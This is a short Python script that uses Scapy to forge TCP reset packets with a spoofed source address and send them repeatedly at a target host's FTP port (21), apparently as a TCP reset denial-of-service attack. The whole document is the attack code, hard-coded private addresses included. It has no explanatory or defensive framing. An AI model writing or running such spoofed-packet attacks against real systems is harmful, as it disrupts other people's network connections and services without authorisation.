
from scapy.all import *
import sys
import os
import time

def rst_attack(source, target, dport, number):
    a = IP(src=source, dst=target)/TCP(dport=dport,flags="R")
    send(a, inter=0.1, loop=1, count=number)

source = "192.168.1.105"
target = "192.168.2.101"
dport = 21
number = 5
rst_attack(source, target, dport, number)
